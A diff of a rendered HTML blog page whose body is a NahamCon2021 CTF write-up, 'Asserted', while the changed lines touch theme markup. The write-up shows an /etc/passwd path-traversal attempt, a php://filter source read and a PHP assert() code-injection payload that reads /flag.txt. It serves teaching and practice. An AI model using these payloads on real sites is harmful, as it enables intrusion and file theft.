@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title> NahamCon2021 CTF - Asserted | #!/slash/note</title>
+  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/'>
   <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
@@ -15,8 +20,8 @@ solution The challenge URL dropped us on a page related to fitness, with not a l
 $ curl &#34;http://challenge." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-03-15T11:52:39&#43;02:00" />
-<meta property="article:modified_time" content="2021-03-15T11:52:39&#43;02:00" />
+<meta property="article:published_time" content="2021-03-15T11:52:39+02:00" />
+<meta property="article:modified_time" content="2021-03-15T11:52:39+02:00" />
 
 
   <meta name="twitter:card" content="summary"/>
@@ -28,8 +33,11 @@ $ curl &#34;http://challenge."/>
 
   
   
+    
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
   
    <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
   
@@ -40,7 +48,7 @@ $ curl &#34;http://challenge."/>
   
 
   
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
 
   
   
@@ -68,8 +76,8 @@ if (!doNotTrack) {
 
   <div id="header-post">
   <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
   <span id="menu" style="visibility: visible;">
     <span id="nav">
       <ul>
@@ -89,25 +97,25 @@ if (!doNotTrack) {
       <ul>
         
         <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/">
+          <a class="icon" href=" https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-ret2basic/">
+          <a class="icon" href="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-ret2basic/" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
         
         <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
         </li>
         <li>
-          <a class="icon" href="#">
+          <a class="icon" href="#" aria-label="Share">
             <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
           </a>
         </li>
@@ -127,57 +135,47 @@ if (!doNotTrack) {
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&text=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&text=NahamCon2021%20CTF%20-%20Asserted" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&is_video=false&description=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&is_video=false&description=NahamCon2021%20CTF%20-%20Asserted" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20Asserted&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f">
+    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20Asserted&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
-      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
-      <i class="fab fa-digg " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&name=NahamCon2021%20CTF%20-%20Asserted&description=category%20web%20-%20medium%0asolution%20The%20challenge%20URL%20dropped%20us%20on%20a%20page%20related%20to%20fitness%2c%20with%20not%20a%20lot%20of%20interesting%20interactions.%0a%20Navigating%20the%20pages%20you%26rsquo%3bd%20see%20a%20URL%20scheme%20where%20a%20page%20parameter%20is%20set.%20Eg%3a%20page%3dabout.%20An%20about.php%20also%20exists%2c%20so%20this%20was%20potentially%20vuln%20to%20LFI.%20Using%20..%20in%20the%20page%20parameter%20resulted%20in%20a%20warning%20message%20indicating%20that%20some%20filtering%20was%20taking%20place.%0a%24%20curl%20%26%2334%3bhttp%3a%2f%2fchallenge.">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&name=NahamCon2021%20CTF%20-%20Asserted&description=category%20web%20-%20medium%0asolution%20The%20challenge%20URL%20dropped%20us%20on%20a%20page%20related%20to%20fitness%2c%20with%20not%20a%20lot%20of%20interesting%20interactions.%0a%20Navigating%20the%20pages%20you%26rsquo%3bd%20see%20a%20URL%20scheme%20where%20a%20page%20parameter%20is%20set.%20Eg%3a%20page%3dabout.%20An%20about.php%20also%20exists%2c%20so%20this%20was%20potentially%20vuln%20to%20LFI.%20Using%20..%20in%20the%20page%20parameter%20resulted%20in%20a%20warning%20message%20indicating%20that%20some%20filtering%20was%20taking%20place.%0a%24%20curl%20%26%2334%3bhttp%3a%2f%2fchallenge." aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&t=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&t=NahamCon2021%20CTF%20-%20Asserted" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -203,38 +201,32 @@ if (!doNotTrack) {
       </h1>
       <div class="meta">
         
-        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <span itemprop="name">
-            
-              #!/slash/note
-            
-          </span>
-        </span>
-        
         <div class="postdate">
           
           <time datetime="2021-03-15 11:52:39 &#43;0200 SAST" itemprop="datePublished">2021-03-15</time>
           
         </div>
         
+        
+        
         <div class="article-category">
-          <i class="fas fa-archive"></i>
-          
-          
-          <a class="category-link" href="https://leonjza.github.io/categories/writeup">writeup</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/ctf">ctf</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/nahamcon">nahamcon</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/nahamcon2021">nahamcon2021</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/2021">2021</a>
-          
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/writeup">writeup</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/ctf">ctf</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/nahamcon">nahamcon</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/nahamcon2021">nahamcon2021</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/2021">2021</a>
+            
         </div>
         
         
@@ -251,13 +243,13 @@ if (!doNotTrack) {
 </figure>
 
 <p>Navigating the pages you&rsquo;d see a URL scheme where a <code>page</code> parameter is set. Eg: <code>page=about</code>. An <code>about.php</code> also exists, so this was potentially vuln to LFI. Using <code>..</code> in the <code>page</code> parameter resulted in a warning message indicating that some filtering was taking place.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#87ceeb">&#34;http://challenge.nahamcon.com:31497/index.php?page=../../../../../../../etc/passwd&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#87ceeb">&#34;http://challenge.nahamcon.com:31497/index.php?page=../../../../../../../etc/passwd&#34;</span>
 HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE
 </code></pre></div><p>PHP has <a href="https://www.php.net/manual/en/wrappers.php">stream wrappers</a>, one we could use to <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter">read files from the filesystem</a>. E.g.: <code>php://filter/convert.base64-encode/resource=&lt;file&gt;</code>. Specifying a file path with a <code>..</code> it still triggered the security check, but, we could download the source of the <code>index.php</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#87ceeb">&#34;http://challenge.nahamcon.com:31497/index.php?page=php://filter/convert.base64-encode/resource=index&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#87ceeb">&#34;http://challenge.nahamcon.com:31497/index.php?page=php://filter/convert.base64-encode/resource=index&#34;</span>
 PD9waHANCg0KaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsNCiAgJGZpbGUgPSAkcGFnZSAuICIucGhwIjsNCg0KICAvLyBTYXZpbmcgb3Vyc2VsdmVzIGZyb20gYW55IGtpbmQgb2YgaGFja2luZ3MgYW5kIGFsbA0KICBhc3NlcnQoInN0cnBvcygnJGZpbGUnLCAnLi4nKSA9PT0gZmFsc2UiKSBvciBkaWUoIkhBQ0tJTkcgREVURUNURUQhIFBMRUFTRSBTVE9QIFRIRSBIQUNLSU5HIFBSRVRUWSBQTEVBU0UiKTsNCiAgDQp9IGVsc2Ugew0KICAkZmlsZSA9ICJob21lLnBocCI7DQp9DQoNCmluY2x1ZGUoJGZpbGUpOw0KDQo/Pg0K
 </code></pre></div><p>Decoding that reveals the check in place.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
 
 <span style="color:#f00">if</span> (isset(<span style="color:#eedd82">$_GET</span>[<span style="color:#87ceeb">&#39;page&#39;</span>])) {
   <span style="color:#eedd82">$page</span> = <span style="color:#eedd82">$_GET</span>[<span style="color:#87ceeb">&#39;page&#39;</span>];
@@ -275,7 +267,7 @@ PD9waHANCg0KaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICRwYWdlID0gJF9HRVRbJ3BhZ2Un
 <span style="color:#e5e5e5">?&gt;</span>
 </code></pre></div><p>Immediately you should see that an <code>assert()</code> is called with some PHP source code as a string. We can inject PHP source code here because we can taint the string passed to <code>assert()</code> as <code>$file</code> is from the request, and thus user controlled.</p>
 <p>Testing this locally was pretty easy. Before the <code>assert()</code> call I added a line to log what the string would look like first. I then served the script with <code>php -S localhost:1337</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#0f0">// ...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#0f0">// ...
 </span><span style="color:#0f0"></span>
 <span style="color:#eedd82">$d</span> = <span style="color:#87ceeb">&#34;strpos(&#39;</span><span style="color:#87ceeb">$file</span><span style="color:#87ceeb">&#39;, &#39;..&#39;) === false&#34;</span>;
 error_log(print_r(<span style="color:#eedd82">$d</span>, <span style="color:#f00">TRUE</span>));
@@ -286,7 +278,7 @@ error_log(print_r(<span style="color:#eedd82">$d</span>, <span style="color:#f00
 </figure>
 
 <p>Passing <code>','foo') === false &amp;&amp; strpos('1</code> as a <code>page</code> parameter value would result in the application saying that it could not find the file we wanted to include. Excellent! The challenge hint tells us that the flag is in <code>/flag.txt</code>, so to echo that I just added a <code>die(file_get_contents('/flag.txt'))</code>, exactly the same way the security check worked.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ curl -G &#34;http://challenge.nahamcon.com:31497/&#34; --data-urlencode &#34;page=&#39;,&#39;foo&#39;) === false &amp;&amp; die(file_get_contents(&#39;/flag.txt&#39;)) &amp;&amp; strpos(&#39;1&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ curl -G &#34;http://challenge.nahamcon.com:31497/&#34; --data-urlencode &#34;page=&#39;,&#39;foo&#39;) === false &amp;&amp; die(file_get_contents(&#39;/flag.txt&#39;)) &amp;&amp; strpos(&#39;1&#34;
 flag{85a25711fa6e111ed54b86468a45b90c}
 </code></pre></div>
     </div>
@@ -358,57 +350,47 @@ flag{85a25711fa6e111ed54b86468a45b90c}
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&text=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&text=NahamCon2021%20CTF%20-%20Asserted" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&is_video=false&description=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&is_video=false&description=NahamCon2021%20CTF%20-%20Asserted" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20Asserted&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f">
+    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20Asserted&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
-      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&title=NahamCon2021%20CTF%20-%20Asserted">
-      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&name=NahamCon2021%20CTF%20-%20Asserted&description=category%20web%20-%20medium%0asolution%20The%20challenge%20URL%20dropped%20us%20on%20a%20page%20related%20to%20fitness%2c%20with%20not%20a%20lot%20of%20interesting%20interactions.%0a%20Navigating%20the%20pages%20you%26rsquo%3bd%20see%20a%20URL%20scheme%20where%20a%20page%20parameter%20is%20set.%20Eg%3a%20page%3dabout.%20An%20about.php%20also%20exists%2c%20so%20this%20was%20potentially%20vuln%20to%20LFI.%20Using%20..%20in%20the%20page%20parameter%20resulted%20in%20a%20warning%20message%20indicating%20that%20some%20filtering%20was%20taking%20place.%0a%24%20curl%20%26%2334%3bhttp%3a%2f%2fchallenge.">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&name=NahamCon2021%20CTF%20-%20Asserted&description=category%20web%20-%20medium%0asolution%20The%20challenge%20URL%20dropped%20us%20on%20a%20page%20related%20to%20fitness%2c%20with%20not%20a%20lot%20of%20interesting%20interactions.%0a%20Navigating%20the%20pages%20you%26rsquo%3bd%20see%20a%20URL%20scheme%20where%20a%20page%20parameter%20is%20set.%20Eg%3a%20page%3dabout.%20An%20about.php%20also%20exists%2c%20so%20this%20was%20potentially%20vuln%20to%20LFI.%20Using%20..%20in%20the%20page%20parameter%20resulted%20in%20a%20warning%20message%20indicating%20that%20some%20filtering%20was%20taking%20place.%0a%24%20curl%20%26%2334%3bhttp%3a%2f%2fchallenge." aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&t=NahamCon2021%20CTF%20-%20Asserted">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-asserted%2f&t=NahamCon2021%20CTF%20-%20Asserted" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -418,13 +400,13 @@ flag{85a25711fa6e111ed54b86468a45b90c}
 
     <div id="actions-footer">
       
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
           <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
           <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
           <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
           <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -460,6 +442,7 @@ flag{85a25711fa6e111ed54b86468a45b90c}
 <link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
 <script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
 <script src=https://leonjza.github.io/js/main.js></script>
+<script src=https://leonjza.github.io/js/code-copy.js></script>
 
 
 
